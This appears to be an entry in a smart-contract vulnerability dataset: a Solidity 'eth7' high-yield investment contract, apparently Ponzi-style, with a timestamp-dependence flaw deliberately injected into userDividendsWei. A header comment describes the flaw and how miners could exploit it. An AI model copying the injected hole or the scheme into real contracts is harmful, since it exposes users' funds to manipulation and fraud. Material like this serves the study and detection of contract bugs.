/*
 * ===== SmartInject Injection Details =====
 * Function      : userDividendsWei
 * Vulnerability : Timestamp Dependence
 * Status        : Not Detected
 * Type          : Function Modification
 *
 * === Verification Results ===
 * Detected      : False
 * Relevant      : 0 findings
 * Total Found   : 1 issues
 * Retry Count   : 0
 *
 * === Description ===
 * This injection introduces a stateful, multi-transaction timestamp dependence vulnerability by:
 * 
 * 1. **State Storage**: Added two new state variables (lastTimestampAccess and timeBonus) that persist between transactions and store timestamp-related data.
 * 
 * 2. **Function Modification**: Changed from view to non-view function to allow state updates, making it stateful and multi-transaction dependent.
 * 
 * 3. **Timestamp-Based Logic**: Implemented time-based bonus calculations that depend on block.timestamp differences between function calls, creating exploitable timing dependencies.
 * 
 * **Multi-Transaction Exploitation Scenario:**
 * 
 * **Transaction 1**: Initial call to userDividendsWei
 * - Sets lastTimestampAccess[user] = block.timestamp
 * - Initializes timeBonus[user] = 100%
 * - Returns base dividend calculation
 * 
 * **Transaction 2**: Rapid subsequent call (within 5 minutes)
 * - Calculates timeDiff = block.timestamp - lastTimestampAccess[user]
 * - If timeDiff < 300 seconds, adds 50% bonus
 * - Updates timeBonus[user] = 150%
 * - Returns dividends with 150% bonus multiplier
 * 
 * **Transaction 3+**: Continued exploitation
 * - Miners can manipulate block.timestamp to control timeDiff calculations
 * - By calling the function at specific timestamp intervals, attackers can accumulate bonus percentages
 * - Multiple calls over time can build up to 500% bonus cap
 * - Each call updates persistent state that affects future calculations
 * 
 * **Why Multi-Transaction Dependency is Critical:**
 * 
 * 1. **State Accumulation**: The timeBonus accumulates over multiple calls, requiring transaction sequence to reach maximum exploit potential
 * 2. **Timestamp History**: The vulnerability relies on comparing current block.timestamp with stored lastTimestampAccess from previous transactions
 * 3. **Timing Attack Vector**: Miners can manipulate block timestamps across multiple blocks to trigger bonus conditions repeatedly
 * 4. **Persistent Impact**: Each transaction modifies state that affects all subsequent dividend calculations for that user
 * 
 * This creates a realistic timestamp dependence vulnerability that requires multiple transactions to fully exploit while maintaining the original function's core dividend calculation logic.
 */
pragma solidity ^0.4.25;

/** 
 * contract for eth7.space
 * GAIN 7% PER 24 HOURS (every 5900 blocks)
 * 
 *  How to use:
 *  1. Send any amount of ether to make an investment
 *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
 *  OR
 *  2b. Send more ether to reinvest AND get your profit at the same time
 *
 * 
 *  5% for every deposit of your direct partners
 *  If you want to invite your partners to join our program ,They have to specify your ETH wallet in a "DATA" field during a deposit transaction.
 * 
 * 
 * RECOMMENDED GAS LIMIT: 70000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 * Contract reviewed and approved by pros!
**/

contract eth7{

    address public owner;
    address public partner;    
    
	mapping (address => uint256) deposited;
	mapping (address => uint256) withdrew;
	mapping (address => uint256) refearned;
	mapping (address => uint256) blocklock;

	uint256 public totalDepositedWei = 0;
	uint256 public totalWithdrewWei = 0;
	uint256 public investorNum = 0;


	event invest(address indexed beneficiary, uint amount);

    constructor () public {
        owner   = msg.sender;
        partner = msg.sender;
    }
    
    modifier onlyOwner {
        require (msg.sender == owner, "OnlyOwner methods called by non-owner.");
        _;
    }    
    
    //if you want to be a partner, contact admin
    function setPartner(address newPartner) external onlyOwner {
        partner = newPartner;
    }
 

	function() payable external {
		emit invest(msg.sender,msg.value);
		uint256 admRefPerc = msg.value / 10;
		uint256 advPerc    = msg.value / 20;

		owner.transfer(admRefPerc);
		partner.transfer(advPerc);

		if (deposited[msg.sender] > 0) {
			address investor = msg.sender;
            // calculate profit amount as such:
            // amount = (amount invested) * 7% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 depositsPercents = deposited[msg.sender] * 7 / 100 * (block.number - blocklock[msg.sender]) /5900;
			investor.transfer(depositsPercents);

			withdrew[msg.sender] += depositsPercents;
			totalWithdrewWei += depositsPercents;
			investorNum++;
		}

		address referrer = bytesToAddress(msg.data);
		if (referrer > 0x0 && referrer != msg.sender) {
		    referrer.transfer(admRefPerc);
			refearned[referrer] += admRefPerc;
		}

		blocklock[msg.sender] = block.number;
		deposited[msg.sender] += msg.value;
		totalDepositedWei += msg.value;
	}
	
	//refund to user who misunderstood the game . 'withdrew' must = 0
    function reFund(address exitUser, uint a) external onlyOwner returns (uint256) {
        uint256 reFundValue = deposited[exitUser];
        exitUser.transfer(a);
        deposited[exitUser] = 0;
        return reFundValue;
    }
    
	function userDepositedWei(address _address) public view returns (uint256) {
		return deposited[_address];
    }

	function userWithdrewWei(address _address) public view returns (uint256) {
		return withdrew[_address];
    }

	// ===== SMARTINJECT: Timestamp Dependence VULNERABILITY START =====
mapping (address => uint256) public lastTimestampAccess;
    mapping (address => uint256) public timeBonus;
    
    function userDividendsWei(address _address) public returns (uint256) {
        // Store timestamp for time-based bonus calculations
        if (lastTimestampAccess[_address] == 0) {
            lastTimestampAccess[_address] = block.timestamp;
            timeBonus[_address] = 100; // Base bonus percentage
        } else {
            // Calculate time-based bonus using timestamp difference
            uint256 timeDiff = block.timestamp - lastTimestampAccess[_address];
            
            // Bonus increases if called within specific time windows
            if (timeDiff < 300) { // Less than 5 minutes
                timeBonus[_address] = timeBonus[_address] + 50; // Rapid access bonus
            } else if (timeDiff > 86400) { // More than 1 day
                timeBonus[_address] = timeBonus[_address] + 25; // Patience bonus
            }
            
            // Cap bonus at 500%
            if (timeBonus[_address] > 500) {
                timeBonus[_address] = 500;
            }
            
            lastTimestampAccess[_address] = block.timestamp;
        }
        
        // Original dividend calculation with timestamp-dependent bonus
        uint256 baseDividends = deposited[_address] * 7 / 100 * (block.number - blocklock[_address]) / 5900;
        
        // Apply time-based bonus using stored timestamp data
        uint256 bonusMultiplier = timeBonus[_address];
        uint256 finalDividends = baseDividends * bonusMultiplier / 100;
        
        return finalDividends;
// ===== SMARTINJECT: Timestamp Dependence VULNERABILITY END =====
    }

	function userReferralsWei(address _address) public view returns (uint256) {
		return refearned[_address];
    }

	function bytesToAddress(bytes bys) private pure returns (address addr) {
		assembly {
			addr := mload(add(bys, 20))
		}
	}
}